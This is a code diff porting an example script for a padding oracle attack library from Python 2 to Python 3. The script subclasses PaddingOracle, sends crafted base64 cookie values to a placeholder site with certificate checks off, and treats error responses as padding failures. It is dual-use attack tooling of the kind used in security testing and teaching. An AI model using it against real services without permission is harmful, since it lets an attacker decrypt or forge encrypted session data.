@@ -1,17 +1,28 @@
-# -*- coding: utf-8 -*-
-from paddingoracle import BadPaddingException, PaddingOracle
+'''
+Example for a http server target
+'''
+
+
 from base64 import b64encode, b64decode
-from urllib import quote, unquote
-import requests
+from urllib.parse import quote, unquote
 import socket
 import time
+import requests
+from paddingoracle import BadPaddingException, PaddingOracle
 
 
 class PadBuster(PaddingOracle):
+    '''
+    Implementation for the needed abstract method oracle
+    '''
+
     def __init__(self, **kwargs):
         super(PadBuster, self).__init__(**kwargs)
         self.session = requests.Session()
         self.wait = kwargs.get('wait', 2.0)
+
+    def analyze(self, **kwargs):
+        return
 
     def oracle(self, data, **kwargs):
         somecookie = quote(b64encode(data))
@@ -20,18 +31,18 @@ class PadBuster(PaddingOracle):
         while 1:
             try:
                 response = self.session.get('http://www.example.com/',
-                        stream=False, timeout=5, verify=False)
+                                            stream=False, timeout=5, verify=False)
                 break
             except (socket.error, requests.exceptions.RequestException):
-                logging.exception('Retrying request in %.2f seconds...',
-                                  self.wait)
+                logging.exception(
+                    'Retrying request in %.2f seconds...' % (self.wait))
                 time.sleep(self.wait)
                 continue
 
         self.history.append(response)
 
         if response.ok:
-            logging.debug('No padding exception raised on %r', somecookie)
+            logging.debug('No padding exception raised on %r' % (somecookie))
             return
 
         raise BadPaddingException
@@ -42,7 +53,7 @@ if __name__ == '__main__':
     import sys
 
     if not sys.argv[1:]:
-        print 'Usage: %s <somecookie value>' % (sys.argv[0], )
+        print('Usage: %s <somecookie value>' % (sys.argv[0]))
         sys.exit(1)
 
     logging.basicConfig(level=logging.DEBUG)
